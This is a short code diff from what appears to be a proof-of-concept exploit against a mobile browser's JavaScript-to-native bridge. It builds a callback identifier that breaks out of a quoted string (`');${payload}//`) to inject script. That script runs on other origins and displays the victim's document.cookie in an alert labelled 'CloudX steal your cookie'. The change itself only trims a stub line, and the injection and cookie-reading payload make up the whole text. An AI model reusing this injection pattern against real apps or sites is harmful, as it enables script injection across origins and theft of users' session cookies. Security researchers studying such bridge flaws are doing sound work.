@@ -19,7 +19,7 @@
         });
 
         const currUrl = location.href;
-        const payload = `window.hwbr=window.hwbr||{};window.hwbr.callbackFromNative=window.hwbr.callbackFromNative||(()=>{});if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal your cookie : '+document.cookie);}`;
+        const payload = `if(!location.href.startsWith("${currUrl}")&&!window.__cloudx_called){window.__cloudx_called=true;alert('CloudX steal your cookie : '+document.cookie);}`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
 
         // 缓存回调函数
